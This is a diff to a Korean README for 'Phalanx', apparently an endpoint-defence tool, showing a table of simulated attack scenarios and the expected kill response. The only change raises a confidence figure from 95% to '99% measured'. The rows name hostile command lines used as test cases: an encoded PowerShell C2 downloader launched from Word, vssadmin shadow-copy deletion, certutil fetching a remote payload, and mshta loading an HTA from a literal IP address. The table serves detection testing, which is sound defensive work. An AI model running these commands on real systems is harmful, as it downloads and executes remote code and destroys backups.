@@ -150,7 +150,7 @@ Phalanx는 타 저장소(예: MundusVivens)에 대한 런타임 의존성 없이
 
 | ID | 시나리오 명칭 | 시뮬레이션 페이로드 및 동작 | 기대 처분 (`ExpectedAction`) | 대응 파이프라인 |
 |---|---|---|---|---|
-| **1** | Office LOLBAS C2 Dropper | `winword.exe` ➔ `powershell.exe -enc <C2 다운로더>` | `ACTION_KILL` | 24μs 선제 동결 ➔ ReAct 3턴 사살 (확신도 95%) |
+| **1** | Office LOLBAS C2 Dropper | `winword.exe` ➔ `powershell.exe -enc <C2 다운로더>` | `ACTION_KILL` | 24μs 선제 동결 ➔ ReAct 3턴 사살 (확신도 99% 실측) |
 | **2** | Ransomware Shadow Copy Deletion | `vssadmin.exe delete shadows /all /quiet` | `ACTION_KILL` | C++ 커널 룰 엔진 0.08ms 즉각 현장 사살 (Reflex Kill) |
 | **3** | LOLBAS CertUtil Remote Payload | `excel.exe` ➔ `certutil.exe -urlcache -split -f http://...` | `ACTION_KILL` | 24μs 동결 ➔ 위협 평판 조회 ➔ 사살 및 IoC 등록 |
 | **4** | Browser Drive-by HTA Attack | `msedge.exe` ➔ `mshta.exe http://185.220.101.5/invoice.hta` | `ACTION_KILL` | 24μs 동결 ➔ MITRE ATT&CK T1218.005 분류 ➔ 사살 |
